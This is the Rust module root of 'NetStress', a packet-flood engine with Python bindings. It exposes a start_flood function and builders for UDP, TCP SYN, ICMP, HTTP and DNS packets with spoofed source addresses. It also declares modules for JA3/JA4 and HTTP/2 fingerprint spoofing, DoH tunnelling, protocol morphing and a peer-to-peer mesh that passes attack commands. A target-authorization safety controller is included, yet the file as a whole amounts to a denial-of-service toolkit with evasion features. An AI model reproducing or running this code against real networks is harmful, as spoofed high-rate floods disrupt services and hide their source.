//! NetStress Native Engine
//! High-performance packet generation using Rust with PyO3 bindings
//!
//! Project Titan Upgrade: Added TLS/JA3 spoofing and precision timing

mod adaptive;
mod atomic_stats;
mod audit;
mod backend;
mod backend_selector;
mod doh_tunnel;
mod engine;
mod http2_fingerprint;
mod ja4_spoof;
mod kademlia;
#[cfg(feature = "p2p_mesh")]
mod p2p_mesh;
mod packet;
mod pool;
mod precision_timer;
mod protocol_builder;
mod queue;
#[cfg(feature = "quic")]
mod quic_http3_engine;
mod rate_limiter;
mod real_morph;
#[cfg(feature = "rl_agent")]
mod rl_agent;
mod safety;
mod shared_memory;
mod simd;
mod stats;
mod tls_spoof;

#[cfg(feature = "cuda")]
mod cuda_generator;

#[cfg(feature = "cuda")]
mod gpu_memory;

#[cfg(feature = "cuda")]
mod gpu_direct;

#[cfg(test)]
mod tests;

#[cfg(test)]
mod test_rio_buffer;

#[cfg(test)]
mod test_rio_fallback;

#[cfg(test)]
mod test_rio_fallback_property;

#[cfg(all(test, target_os = "macos"))]
mod test_macos_backend_fallback;

#[cfg(all(test, target_os = "linux"))]
mod test_linux_backend_fallback_property;

#[cfg(all(test, target_os = "linux", feature = "af_xdp"))]
mod test_linux_xdp_fallback_property;

#[cfg(all(test, target_os = "linux"))]
mod test_linux_afxdp_iouring_fallback_property;

#[cfg(test)]
mod test_p2p_failover_property;

#[cfg(all(test, feature = "rl_agent"))]
mod test_rl_adaptive_scaling_property;

#[cfg(all(test, feature = "quic"))]
mod test_quic_migration_property;

#[cfg(target_os = "linux")]
mod linux_optimizations;

#[cfg(target_os = "linux")]
mod linux_afxdp;

#[cfg(target_os = "linux")]
mod linux_afxdp_iouring;

#[cfg(all(target_os = "linux", feature = "af_xdp"))]
mod linux_xdp_aya;

#[cfg(target_os = "linux")]
mod linux_fallback;

#[cfg(target_os = "windows")]
mod windows_backend;

#[cfg(all(target_os = "windows", feature = "registered_io"))]
mod windows_rio;

#[cfg(target_os = "macos")]
mod macos_backend;

#[cfg(target_os = "macos")]
mod macos_network_framework;

use parking_lot::RwLock;
use pyo3::exceptions::PyRuntimeError;
use pyo3::prelude::*;
use pyo3::types::PyModule;
use std::collections::HashMap;
use std::sync::Arc;
use std::time::{Duration, Instant};

pub use adaptive::{AdaptiveScaler, ConfigAdjustment, DeviceTier, AdaptiveEngineConfig, HardwareProfile, PerformanceMetrics, PerformanceMonitor};
pub use atomic_stats::{AtomicStats, StatsCollector, StatsSnapshot, ThreadStats};
pub use audit::{AuditEntry, AuditEventType, AuditLogger, ChainVerificationResult};
pub use backend_selector::{BackendSelector, CapabilityReport};
pub use doh_tunnel::{DnsEncoder, DohClient, DohTunnel, TunnelError};
pub use engine::{EngineConfig, EngineState, FloodEngine};
pub use http2_fingerprint::{Http2FingerprintManager, Http2Profile, FrameType, SettingsParameter};
pub use ja4_spoof::{Ja4Profile, Ja4Spoofer};
pub use kademlia::{AttackConfig, KademliaError, KademliaNode, KademliaRpc, NodeId, PeerInfo};
#[cfg(feature = "p2p_mesh")]
pub use p2p_mesh::{AttackCommand, P2PMesh, P2PMeshError, P2PStats};
pub use packet::{PacketBuilder, PacketFlags, Protocol};
pub use pool::PacketPool;
#[cfg(feature = "quic")]
pub use quic_http3_engine::{QuicHttp3Engine, QuicBrowserProfile, QuicStats};
pub use protocol_builder::{BatchPacketGenerator, FragmentConfig, ProtocolBuilder, SpoofConfig};
pub use real_morph::{MorphState, MorphType, ProtocolMorpher};
#[cfg(feature = "rl_agent")]
pub use rl_agent::{Action, ActionType, AttackConfig, Experience, ObservationState, OnlineLearningSystem, RLAgent, RLError};
pub use safety::{EmergencyStop, SafetyController, SafetyError, TargetAuthorization};
pub use shared_memory::{AutoUpdatingWriter, BackendType, SharedMemoryWriter, SharedStatsSnapshot};
pub use stats::Stats;
pub use tls_spoof::{JA3Spoofer, TlsProfile};
// Note: StatsSnapshot is already exported from atomic_stats

#[cfg(feature = "cuda")]
pub use cuda_generator::{CudaConfig, CudaError, CudaPacketGenerator, CudaStats, GpuInfo};

#[cfg(feature = "cuda")]
pub use gpu_memory::{GpuMemoryBuffer, GpuMemoryError, GpuMemoryPool, TransferStats};

#[cfg(feature = "cuda")]
pub use gpu_direct::{GpuDirectCapabilities, GpuDirectError, GpuDirectManager, GpuDirectStats};

#[cfg(target_os = "linux")]
pub use linux_optimizations::LinuxOptimizer;

#[cfg(target_os = "linux")]
pub use linux_afxdp::{AfXdpBackend};

#[cfg(target_os = "linux")]
pub use linux_afxdp_iouring::{AfXdpIoUringBackend, AfXdpIoUringEnhancedStats};

#[cfg(target_os = "linux")]
pub use linux_fallback::{FallbackStatsSnapshot, LinuxFallbackBackend};

#[cfg(target_os = "windows")]
pub use windows_backend::{IOCPBackend, RegisteredIOBackend, WindowsOptimizer};

#[cfg(all(target_os = "windows", feature = "registered_io"))]
pub use windows_rio::{RioBackend, RioDetector};

#[cfg(target_os = "macos")]
pub use macos_backend::{KqueueBackend, MacOSOptimizer};

#[cfg(target_os = "macos")]
pub use macos_network_framework::{MacOSVersion, NetworkFrameworkBackend};

// FFI declarations for C driver
#[cfg(feature = "dpdk")]
extern "C" {
    fn init_dpdk_port(port_id: i32) -> i32;
    fn dpdk_send_burst(
        port_id: i32,
        packets: *const *const u8,
        lengths: *const u32,
        count: u32,
    ) -> i32;
    fn cleanup_dpdk() -> i32;
}

#[cfg(feature = "af_xdp")]
extern "C" {
    fn init_af_xdp(ifname: *const i8) -> i32;
    fn af_xdp_send(data: *const u8, len: u32) -> i32;
    fn cleanup_af_xdp() -> i32;
}

// Fallback stubs when features not enabled
#[cfg(not(feature = "dpdk"))]
mod dpdk_stub {
    pub unsafe fn init_dpdk_port(_port_id: i32) -> i32 {
        -1
    }
    pub unsafe fn dpdk_send_burst(
        _port_id: i32,
        _packets: *const *const u8,
        _lengths: *const u32,
        _count: u32,
    ) -> i32 {
        -1
    }
    pub unsafe fn cleanup_dpdk() -> i32 {
        0
    }
}
#[cfg(not(feature = "dpdk"))]
use dpdk_stub::*;

/// Python-exposed PacketEngine class with context manager support
///
/// **Validates: Requirements 1.3** - Create `PacketEngine` Python class
/// **Validates: Requirements 1.5** - Zero-copy data transfer with PyBytes
#[pyclass]
pub struct PacketEngine {
    target: String,
    port: u16,
    engine: Arc<RwLock<FloodEngine>>,
    stats: Arc<RwLock<Stats>>,
    config_json: String,
}

#[pymethods]
impl PacketEngine {
    /// Create a new PacketEngine
    ///
    /// Args:
    ///     target: Target IP address or hostname
    ///     port: Target port number
    ///     threads: Number of worker threads (default: CPU cores)
    ///     packet_size: Size of each packet in bytes (default: 1472)
    ///     protocol: Protocol to use (udp, tcp, icmp, http)
    ///     rate_limit: Maximum packets per second (optional)
    #[new]
    #[pyo3(signature = (target, port, threads=None, packet_size=1472, protocol="udp", rate_limit=None))]
    fn new(
        target: String,
        port: u16,
        threads: Option<usize>,
        packet_size: usize,
        protocol: &str,
        rate_limit: Option<u64>,
    ) -> PyResult<Self> {
        let proto = match protocol.to_lowercase().as_str() {
            "udp" => Protocol::UDP,
            "tcp" => Protocol::TCP,
            "icmp" => Protocol::ICMP,
            "http" => Protocol::HTTP,
            _ => {
                return Err(PyRuntimeError::new_err(format!(
                    "Unknown protocol: {}",
                    protocol
                )))
            }
        };

        let thread_count = threads.unwrap_or_else(|| {
            std::thread::available_parallelism()
                .map(|p| p.get())
                .unwrap_or(4)
        });

        let config = EngineConfig {
            target: target.clone(),
            port,
            threads: thread_count,
            packet_size,
            protocol: proto,
            rate_limit,
            ..Default::default()
        };

        let config_json = config.to_json();

        let engine = FloodEngine::new(config)
            .map_err(|e| PyRuntimeError::new_err(format!("Failed to create engine: {}", e)))?;

        Ok(Self {
            target,
            port,
            engine: Arc::new(RwLock::new(engine)),
            stats: Arc::new(RwLock::new(Stats::new())),
            config_json,
        })
    }

    /// Create PacketEngine from JSON configuration
    ///
    /// **Validates: Requirements 1.1** - Accept JSON configuration from Python
    #[staticmethod]
    fn from_json(json: &str) -> PyResult<Self> {
        let config = EngineConfig::from_json(json)
            .map_err(|e| PyRuntimeError::new_err(format!("Invalid JSON config: {}", e)))?;

        let target = config.target.clone();
        let port = config.port;
        let config_json = config.to_json();

        let engine = FloodEngine::new(config)
            .map_err(|e| PyRuntimeError::new_err(format!("Failed to create engine: {}", e)))?;

        Ok(Self {
            target,
            port,
            engine: Arc::new(RwLock::new(engine)),
            stats: Arc::new(RwLock::new(Stats::new())),
            config_json,
        })
    }

    /// Start the packet engine (releases GIL during execution)
    ///
    /// **Validates: Requirements 1.2** - Execute without GIL contention
    fn start(&self, py: Python<'_>) -> PyResult<()> {
        // Release GIL while starting the engine
        py.allow_threads(|| {
            let mut engine = self.engine.write();
            engine
                .start()
                .map_err(|e| PyRuntimeError::new_err(format!("Failed to start: {}", e)))
        })
    }

    /// Stop the packet engine
    fn stop(&self, py: Python<'_>) -> PyResult<()> {
        // Release GIL while stopping the engine
        py.allow_threads(|| {
            let mut engine = self.engine.write();
            engine
                .stop()
                .map_err(|e| PyRuntimeError::new_err(format!("Failed to stop: {}", e)))
        })
    }

    /// Get current statistics as a dictionary
    fn get_stats(&self) -> PyResult<PyObject> {
        Python::with_gil(|py| {
            let engine = self.engine.read();
            let snapshot = engine.get_stats();

            let dict = pyo3::types::PyDict::new_bound(py);
            dict.set_item("packets_sent", snapshot.packets_sent)?;
            dict.set_item("bytes_sent", snapshot.bytes_sent)?;
            dict.set_item("packets_per_second", snapshot.pps)?;
            dict.set_item("bytes_per_second", snapshot.bps)?;
            dict.set_item("errors", snapshot.errors)?;
            dict.set_item("duration_secs", snapshot.duration.as_secs_f64())?;
            dict.set_item("mbps", snapshot.mbps())?;
            dict.set_item("gbps", snapshot.gbps())?;

            Ok(dict.into())
        })
    }

    /// Get statistics as zero-copy bytes (JSON format)
    ///
    /// **Validates: Requirements 1.5** - Zero-copy data transfer with PyBytes
    fn get_stats_bytes(&self, py: Python<'_>) -> PyResult<PyObject> {
        let engine = self.engine.read();
        let snapshot = engine.get_stats();

        let json = format!(
            r#"{{"packets_sent":{},"bytes_sent":{},"pps":{},"bps":{},"errors":{},"duration_secs":{:.3}}}"#,
            snapshot.packets_sent,
            snapshot.bytes_sent,
            snapshot.pps,
            snapshot.bps,
            snapshot.errors,
            snapshot.duration.as_secs_f64()
        );

        // Return as PyBytes for zero-copy access
        Ok(pyo3::types::PyBytes::new_bound(py, json.as_bytes()).into())
    }

    /// Check if engine is running
    fn is_running(&self) -> bool {
        let engine = self.engine.read();
        engine.is_running()
    }

    /// Set target rate (packets per second)
    fn set_rate(&self, pps: u64) -> PyResult<()> {
        let mut engine = self.engine.write();
        engine.set_rate(pps);
        Ok(())
    }

    /// Get the configuration as JSON
    fn get_config(&self) -> String {
        self.config_json.clone()
    }

    /// Get peak packets per second achieved
    fn get_peak_pps(&self) -> u64 {
        let engine = self.engine.read();
        engine.get_peak_pps()
    }

    /// Get number of active worker threads
    fn get_active_threads(&self) -> usize {
        let engine = self.engine.read();
        engine.get_active_threads()
    }

    /// Get total batches processed
    fn get_total_batches(&self) -> u64 {
        let engine = self.engine.read();
        engine.get_total_batches()
    }

    /// Context manager entry - start the engine
    ///
    /// **Validates: Requirements 1.3** - Support context manager protocol
    fn __enter__<'py>(slf: PyRef<'py, Self>) -> PyResult<PyRef<'py, Self>> {
        {
            let mut engine = slf.engine.write();
            engine
                .start()
                .map_err(|e| PyRuntimeError::new_err(format!("Failed to start: {}", e)))?;
        }
        Ok(slf)
    }

    /// Context manager exit - stop the engine
    ///
    /// **Validates: Requirements 1.3** - Support context manager protocol
    #[pyo3(signature = (_exc_type=None, _exc_val=None, _exc_tb=None))]
    fn __exit__(
        &self,
        _exc_type: Option<PyObject>,
        _exc_val: Option<PyObject>,
        _exc_tb: Option<PyObject>,
    ) -> PyResult<bool> {
        let mut engine = self.engine.write();
        let _ = engine.stop();
        Ok(false) // Don't suppress exceptions
    }

    /// Get target info
    fn __repr__(&self) -> String {
        format!(
            "PacketEngine(target='{}', port={}, running={})",
            self.target,
            self.port,
            self.is_running()
        )
    }
}

/// High-level flood function exposed to Python
#[pyfunction]
#[pyo3(signature = (target, port, duration=60, rate=100000, threads=4, packet_size=1472, protocol="udp"))]
fn start_flood(
    target: &str,
    port: u16,
    duration: u64,
    rate: u64,
    threads: usize,
    packet_size: usize,
    protocol: &str,
) -> PyResult<PyObject> {
    let proto = match protocol.to_lowercase().as_str() {
        "udp" => Protocol::UDP,
        "tcp" => Protocol::TCP,
        "icmp" => Protocol::ICMP,
        "http" => Protocol::HTTP,
        _ => {
            return Err(PyRuntimeError::new_err(format!(
                "Unknown protocol: {}",
                protocol
            )))
        }
    };

    let config = EngineConfig {
        target: target.to_string(),
        port,
        threads,
        packet_size,
        protocol: proto,
        rate_limit: Some(rate),
        ..Default::default()
    };

    let mut engine = FloodEngine::new(config)
        .map_err(|e| PyRuntimeError::new_err(format!("Failed to create engine: {}", e)))?;

    engine
        .start()
        .map_err(|e| PyRuntimeError::new_err(format!("Failed to start: {}", e)))?;

    // Run for specified duration
    std::thread::sleep(Duration::from_secs(duration));

    engine
        .stop()
        .map_err(|e| PyRuntimeError::new_err(format!("Failed to stop: {}", e)))?;

    // Return final stats
    Python::with_gil(|py| {
        let snapshot = engine.get_stats();
        let dict = pyo3::types::PyDict::new_bound(py);
        dict.set_item("packets_sent", snapshot.packets_sent)?;
        dict.set_item("bytes_sent", snapshot.bytes_sent)?;
        dict.set_item("average_pps", snapshot.pps)?;
        dict.set_item("average_bps", snapshot.bps)?;
        dict.set_item("errors", snapshot.errors)?;
        dict.set_item("duration_secs", snapshot.duration.as_secs_f64())?;
        Ok(dict.into())
    })
}

/// Build a custom packet
#[pyfunction]
#[pyo3(signature = (src_ip, dst_ip, src_port, dst_port, protocol="udp", payload=None))]
fn build_packet(
    src_ip: &str,
    dst_ip: &str,
    src_port: u16,
    dst_port: u16,
    protocol: &str,
    payload: Option<&[u8]>,
) -> PyResult<Vec<u8>> {
    let proto = match protocol.to_lowercase().as_str() {
        "udp" => Protocol::UDP,
        "tcp" => Protocol::TCP,
        "icmp" => Protocol::ICMP,
        _ => {
            return Err(PyRuntimeError::new_err(format!(
                "Unknown protocol: {}",
                protocol
            )))
        }
    };

    let builder = PacketBuilder::new()
        .src_ip(src_ip)
        .dst_ip(dst_ip)
        .src_port(src_port)
        .dst_port(dst_port)
        .protocol(proto);

    let builder = if let Some(data) = payload {
        builder.payload(data)
    } else {
        builder
    };

    builder
        .build()
        .map_err(|e| PyRuntimeError::new_err(format!("Failed to build packet: {}", e)))
}

/// Get system capabilities
#[pyfunction]
fn get_capabilities() -> PyResult<PyObject> {
    Python::with_gil(|py| {
        let dict = pyo3::types::PyDict::new_bound(py);

        // Check DPDK availability
        #[cfg(feature = "dpdk")]
        dict.set_item("dpdk", true)?;
        #[cfg(not(feature = "dpdk"))]
        dict.set_item("dpdk", false)?;

        // Check AF_XDP availability
        #[cfg(feature = "af_xdp")]
        dict.set_item("af_xdp", true)?;
        #[cfg(not(feature = "af_xdp"))]
        dict.set_item("af_xdp", false)?;

        // Platform info
        dict.set_item("platform", std::env::consts::OS)?;
        dict.set_item("arch", std::env::consts::ARCH)?;

        // Thread count
        dict.set_item(
            "cpu_count",
            std::thread::available_parallelism()
                .map(|p| p.get())
                .unwrap_or(1),
        )?;

        Ok(dict.into())
    })
}

/// Get current statistics snapshot
#[pyfunction]
fn get_stats() -> PyResult<PyObject> {
    Python::with_gil(|py| {
        let dict = pyo3::types::PyDict::new_bound(py);
        dict.set_item("status", "idle")?;
        dict.set_item("packets_sent", 0u64)?;
        dict.set_item("bytes_sent", 0u64)?;
        Ok(dict.into())
    })
}

/// Build UDP packet with optional spoofing
#[pyfunction]
#[pyo3(signature = (dst_ip, dst_port, payload, spoof_cidr=None))]
fn build_udp_packet(
    dst_ip: &str,
    dst_port: u16,
    payload: &[u8],
    spoof_cidr: Option<&str>,
) -> PyResult<Vec<u8>> {
    let mut builder = protocol_builder::ProtocolBuilder::new();

    if let Some(cidr) = spoof_cidr {
        builder = builder
            .with_spoofing(cidr)
            .map_err(|e| PyRuntimeError::new_err(format!("Invalid CIDR: {}", e)))?;
    }

    builder
        .build_udp(dst_ip, dst_port, payload)
        .map_err(|e| PyRuntimeError::new_err(format!("Build failed: {}", e)))
}

/// Build TCP SYN packet with optional spoofing
#[pyfunction]
#[pyo3(signature = (dst_ip, dst_port, spoof_cidr=None))]
fn build_tcp_syn(dst_ip: &str, dst_port: u16, spoof_cidr: Option<&str>) -> PyResult<Vec<u8>> {
    let mut builder = protocol_builder::ProtocolBuilder::new();

    if let Some(cidr) = spoof_cidr {
        builder = builder
            .with_spoofing(cidr)
            .map_err(|e| PyRuntimeError::new_err(format!("Invalid CIDR: {}", e)))?;
    }

    builder
        .build_tcp_syn(dst_ip, dst_port)
        .map_err(|e| PyRuntimeError::new_err(format!("Build failed: {}", e)))
}

/// Build ICMP echo request with optional spoofing
#[pyfunction]
#[pyo3(signature = (dst_ip, payload, spoof_cidr=None))]
fn build_icmp_echo(dst_ip: &str, payload: &[u8], spoof_cidr: Option<&str>) -> PyResult<Vec<u8>> {
    let mut builder = protocol_builder::ProtocolBuilder::new();

    if let Some(cidr) = spoof_cidr {
        builder = builder
            .with_spoofing(cidr)
            .map_err(|e| PyRuntimeError::new_err(format!("Invalid CIDR: {}", e)))?;
    }

    builder
        .build_icmp_echo(dst_ip, payload)
        .map_err(|e| PyRuntimeError::new_err(format!("Build failed: {}", e)))
}

/// Build HTTP GET request packet
#[pyfunction]
#[pyo3(signature = (dst_ip, dst_port, host, path="/", spoof_cidr=None))]
fn build_http_get(
    dst_ip: &str,
    dst_port: u16,
    host: &str,
    path: &str,
    spoof_cidr: Option<&str>,
) -> PyResult<Vec<u8>> {
    let mut builder = protocol_builder::ProtocolBuilder::new();

    if let Some(cidr) = spoof_cidr {
        builder = builder
            .with_spoofing(cidr)
            .map_err(|e| PyRuntimeError::new_err(format!("Invalid CIDR: {}", e)))?;
    }

    builder
        .build_http_get(dst_ip, dst_port, host, path)
        .map_err(|e| PyRuntimeError::new_err(format!("Build failed: {}", e)))
}

/// Build DNS query packet
#[pyfunction]
#[pyo3(signature = (dst_ip, domain, spoof_cidr=None))]
fn build_dns_query(dst_ip: &str, domain: &str, spoof_cidr: Option<&str>) -> PyResult<Vec<u8>> {
    let mut builder = protocol_builder::ProtocolBuilder::new();

    if let Some(cidr) = spoof_cidr {
        builder = builder
            .with_spoofing(cidr)
            .map_err(|e| PyRuntimeError::new_err(format!("Invalid CIDR: {}", e)))?;
    }

    builder
        .build_dns_query(dst_ip, domain)
        .map_err(|e| PyRuntimeError::new_err(format!("Build failed: {}", e)))
}

/// Generate batch of packets for high-throughput scenarios
#[pyfunction]
#[pyo3(signature = (dst_ip, dst_port, protocol, payload_size, count, spoof_cidr=None))]
fn generate_packet_batch(
    dst_ip: &str,
    dst_port: u16,
    protocol: &str,
    payload_size: usize,
    count: usize,
    spoof_cidr: Option<&str>,
) -> PyResult<Vec<Vec<u8>>> {
    let proto = match protocol.to_lowercase().as_str() {
        "udp" => Protocol::UDP,
        "tcp" => Protocol::TCP,
        "icmp" => Protocol::ICMP,
        "http" => Protocol::HTTP,
        _ => {
            return Err(PyRuntimeError::new_err(format!(
                "Unknown protocol: {}",
                protocol
            )))
        }
    };

    let mut gen =
        protocol_builder::BatchPacketGenerator::new(dst_ip, dst_port, proto, payload_size);

    if let Some(cidr) = spoof_cidr {
        gen = gen
            .with_spoofing(cidr)
            .map_err(|e| PyRuntimeError::new_err(format!("Invalid CIDR: {}", e)))?;
    }

    Ok(gen.generate_batch(count))
}

/// Get detailed capability report
#[pyfunction]
fn get_capability_report() -> PyResult<PyObject> {
    Python::with_gil(|py| {
        let selector = backend_selector::BackendSelector::new();
        let report = backend_selector::CapabilityReport::generate(&selector);

        let dict = pyo3::types::PyDict::new_bound(py);
        dict.set_item("platform", report.platform)?;
        dict.set_item("arch", report.arch)?;
        dict.set_item("cpu_count", report.cpu_count)?;
        dict.set_item("available_backends", report.available_backends)?;
        dict.set_item("active_backend", report.active_backend)?;
        dict.set_item("has_dpdk", report.has_dpdk)?;
        dict.set_item("has_af_xdp", report.has_af_xdp)?;
        dict.set_item("has_io_uring", report.has_io_uring)?;
        dict.set_item("has_sendmmsg", report.has_sendmmsg)?;
        dict.set_item("kernel_version", report.kernel_version)?;

        Ok(dict.into())
    })
}

/// Get list of available backends
#[pyfunction]
fn get_available_backends() -> PyResult<Vec<String>> {
    let selector = backend_selector::BackendSelector::new();
    Ok(selector
        .available_backends()
        .iter()
        .map(|b| b.name().to_string())
        .collect())
}

/// Get real-time statistics in JSON format
#[pyfunction]
fn get_realtime_stats_json() -> PyResult<String> {
    let collector = atomic_stats::StatsCollector::new();
    Ok(collector.json_metrics())
}

/// Get Prometheus-format metrics
#[pyfunction]
fn get_prometheus_metrics() -> PyResult<String> {
    let collector = atomic_stats::StatsCollector::new();
    Ok(collector.prometheus_metrics())
}

/// Get Linux optimization report (Linux only)
#[cfg(target_os = "linux")]
#[pyfunction]
fn get_linux_optimization_report() -> PyResult<PyObject> {
    Python::with_gil(|py| {
        let optimizer = linux_optimizations::LinuxOptimizer::new();
        let caps = optimizer.capabilities();

        let dict = pyo3::types::PyDict::new_bound(py);
        dict.set_item("platform", "linux")?;
        dict.set_item(
            "kernel_version",
            format!("{}.{}", caps.kernel_version.0, caps.kernel_version.1),
        )?;
        dict.set_item("cpu_count", caps.cpu_count)?;
        dict.set_item("numa_nodes", caps.numa_nodes)?;

        // Feature availability
        dict.set_item("has_dpdk", caps.has_dpdk)?;
        dict.set_item("has_af_xdp", caps.has_af_xdp)?;
        dict.set_item("has_io_uring", caps.has_io_uring)?;
        dict.set_item("has_sendmmsg", caps.has_sendmmsg)?;
        dict.set_item("has_raw_socket", caps.has_raw_socket)?;

        // Enabled features
        dict.set_item("enabled_features", optimizer.enabled_features())?;

        // Recommended backend
        dict.set_item(
            "recommended_backend",
            optimizer.get_recommended_backend().name(),
        )?;

        // Performance recommendations
        dict.set_item(
            "performance_recommendations",
            optimizer.get_performance_recommendations(),
        )?;

        Ok(dict.into())
    })
}

/// Get Linux optimization report (stub for non-Linux)
#[cfg(not(target_os = "linux"))]
#[pyfunction]
fn get_linux_optimization_report() -> PyResult<PyObject> {
    Python::with_gil(|py| {
        let dict = pyo3::types::PyDict::new_bound(py);
        dict.set_item("platform", std::env::consts::OS)?;
        dict.set_item(
            "error",
            "Linux optimizations not available on this platform",
        )?;
        Ok(dict.into())
    })
}

/// Get Windows optimization report (Windows only)
#[cfg(target_os = "windows")]
#[pyfunction]
fn get_windows_optimization_report() -> PyResult<PyObject> {
    Python::with_gil(|py| {
        let optimizer = windows_backend::WindowsOptimizer::new();
        let caps = optimizer.capabilities();

        let dict = pyo3::types::PyDict::new_bound(py);
        dict.set_item("platform", "windows")?;
        dict.set_item(
            "winsock_version",
            format!("{}.{}", caps.winsock_version.0, caps.winsock_version.1),
        )?;
        dict.set_item("cpu_count", caps.cpu_count)?;

        // Feature availability
        dict.set_item("has_iocp", caps.has_iocp)?;
        dict.set_item("has_registered_io", caps.has_registered_io)?;

        // Recommended backend
        dict.set_item(
            "recommended_backend",
            optimizer.get_recommended_backend().name(),
        )?;

        // Performance recommendations
        dict.set_item(
            "performance_recommendations",
            optimizer.get_performance_recommendations(),
        )?;

        // Windows version info
        let (major, minor) = optimizer.get_windows_version();
        dict.set_item("windows_version", format!("{}.{}", major, minor))?;
        dict.set_item("is_server", optimizer.is_windows_server())?;

        Ok(dict.into())
    })
}

/// Get Windows optimization report (stub for non-Windows)
#[cfg(not(target_os = "windows"))]
#[pyfunction]
fn get_windows_optimization_report() -> PyResult<PyObject> {
    Python::with_gil(|py| {
        let dict = pyo3::types::PyDict::new_bound(py);
        dict.set_item("platform", std::env::consts::OS)?;
        dict.set_item(
            "error",
            "Windows optimizations not available on this platform",
        )?;
        Ok(dict.into())
    })
}

/// Get macOS optimization report (macOS only)
#[cfg(target_os = "macos")]
#[pyfunction]
fn get_macos_optimization_report() -> PyResult<PyObject> {
    Python::with_gil(|py| {
        let optimizer = macos_backend::MacOSOptimizer::new();
        let caps = optimizer.capabilities();

        let dict = pyo3::types::PyDict::new_bound(py);
        dict.set_item("platform", "macos")?;
        dict.set_item(
            "darwin_version",
            format!("{}.{}", caps.darwin_version.0, caps.darwin_version.1),
        )?;
        dict.set_item("cpu_count", caps.cpu_count)?;

        // Feature availability
        dict.set_item("has_kqueue", caps.has_kqueue)?;
        dict.set_item("has_sendfile", caps.has_sendfile)?;
        dict.set_item("has_so_nosigpipe", caps.has_so_nosigpipe)?;
        dict.set_item("has_so_reuseport", caps.has_so_reuseport)?;

        // Enabled features
        dict.set_item("enabled_features", optimizer.enabled_features())?;

        // Recommended backend
        dict.set_item(
            "recommended_backend",
            optimizer.get_recommended_backend().name(),
        )?;

        // Performance recommendations
        dict.set_item(
            "performance_recommendations",
            optimizer.get_performance_recommendations(),
        )?;

        // macOS version info
        let (major, minor) = optimizer.get_darwin_version();
        dict.set_item("darwin_version", format!("{}.{}", major, minor))?;
        dict.set_item("is_server", optimizer.is_macos_server())?;

        Ok(dict.into())
    })
}

/// Get macOS optimization report (stub for non-macOS)
#[cfg(not(target_os = "macos"))]
#[pyfunction]
fn get_macos_optimization_report() -> PyResult<PyObject> {
    Python::with_gil(|py| {
        let dict = pyo3::types::PyDict::new_bound(py);
        dict.set_item("platform", std::env::consts::OS)?;
        dict.set_item(
            "error",
            "macOS optimizations not available on this platform",
        )?;
        Ok(dict.into())
    })
}

/// Detect hardware profile automatically
#[pyfunction]
fn detect_hardware_profile() -> PyResult<PyObject> {
    let hardware = adaptive::HardwareProfile::detect();
    
    Python::with_gil(|py| {
        let dict = pyo3::types::PyDict::new_bound(py);
        dict.set_item("cpu_cores", hardware.cpu_cores)?;
        dict.set_item("total_ram_gb", hardware.total_ram / (1024 * 1024 * 1024))?;
        dict.set_item("nic_speed_mbps", hardware.nic_speed)?;
        dict.set_item("tier", format!("{:?}", hardware.tier))?;
        
        // Add tier configuration
        let tier_config = hardware.tier.get_default_config();
        let tier_dict = pyo3::types::PyDict::new_bound(py);
        tier_dict.set_item("threads", tier_config.threads)?;
        tier_dict.set_item("buffer_size", tier_config.buffer_size)?;
        tier_dict.set_item("rate_limit", tier_config.rate_limit)?;
        tier_dict.set_item("batch_size", tier_config.batch_size)?;
        tier_dict.set_item("target_pps", tier_config.target_pps)?;
        dict.set_item("default_config", tier_dict)?;
        
        Ok(dict.into())
    })
}

/// Classify device tier based on hardware specs
#[pyfunction]
fn classify_device_tier(cpu_cores: u32, total_ram_gb: u64, nic_speed_mbps: u32) -> PyResult<PyObject> {
    let total_ram = total_ram_gb * 1024 * 1024 * 1024;
    let tier = adaptive::HardwareProfile::classify_tier(cpu_cores, total_ram, nic_speed_mbps);
    let config = tier.get_default_config();
    
    Python::with_gil(|py| {
        let dict = pyo3::types::PyDict::new_bound(py);
        dict.set_item("tier", format!("{:?}", tier))?;
        dict.set_item("threads", config.threads)?;
        dict.set_item("buffer_size", config.buffer_size)?;
        dict.set_item("rate_limit", config.rate_limit)?;
        dict.set_item("batch_size", config.batch_size)?;
        dict.set_item("target_pps", config.target_pps)?;
        Ok(dict.into())
    })
}

/// Python-exposed SafetyController
#[pyclass]
pub struct PySafetyController {
    inner: safety::SafetyController,
}

#[pymethods]
impl PySafetyController {
    #[new]
    #[pyo3(signature = (max_pps=0))]
    fn new(max_pps: u64) -> Self {
        Self {
            inner: safety::SafetyController::new(max_pps),
        }
    }

    /// Create permissive controller (for testing)
    #[staticmethod]
    fn permissive() -> Self {
        Self {
            inner: safety::SafetyController::permissive(),
        }
    }

    /// Authorize an IP address
    fn authorize_ip(&self, ip: &str) -> PyResult<()> {
        let addr: std::net::IpAddr = ip
            .parse()
            .map_err(|_| PyRuntimeError::new_err(format!("Invalid IP: {}", ip)))?;
        self.inner.authorization.authorize_ip(addr);
        Ok(())
    }

    /// Authorize a CIDR range
    fn authorize_cidr(&self, cidr: &str) -> PyResult<()> {
        self.inner
            .authorization
            .authorize_cidr(cidr)
            .map_err(|e| PyRuntimeError::new_err(format!("{}", e)))
    }

    /// Authorize a domain
    fn authorize_domain(&self, domain: &str) {
        self.inner.authorization.authorize_domain(domain);
    }

    /// Check if target is authorized
    fn is_authorized(&self, target: &str) -> PyResult<bool> {
        match self.inner.authorization.is_authorized(target) {
            Ok(()) => Ok(true),
            Err(_) => Ok(false),
        }
    }

    /// Set strict mode
    fn set_strict_mode(&self, strict: bool) {
        self.inner.authorization.set_strict_mode(strict);
    }

    /// Allow localhost
    fn set_allow_localhost(&self, allow: bool) {
        self.inner.authorization.set_allow_localhost(allow);
    }

    /// Allow private networks
    fn set_allow_private(&self, allow: bool) {
        self.inner.authorization.set_allow_private(allow);
    }

    /// Set maximum PPS
    fn set_max_pps(&self, max_pps: u64) {
        self.inner.rate_limiter.set_max_pps(max_pps);
    }

    /// Get current PPS
    fn current_pps(&self) -> u64 {
        self.inner.rate_limiter.current_pps()
    }

    /// Trigger emergency stop
    fn emergency_stop(&self, reason: &str) {
        self.inner.emergency_stop.trigger(reason);
    }

    /// Check if emergency stopped
    fn is_stopped(&self) -> bool {
        self.inner.emergency_stop.is_stopped()
    }

    /// Reset emergency stop
    fn reset_emergency_stop(&self) {
        self.inner.emergency_stop.reset();
    }

    /// Get stop reason
    fn stop_reason(&self) -> Option<String> {
        self.inner.emergency_stop.reason()
    }

    /// Perform all safety checks
    fn check_all(&self, target: &str) -> PyResult<()> {
        self.inner
            .check_all(target)
            .map_err(|e| PyRuntimeError::new_err(format!("{}", e)))
    }
}

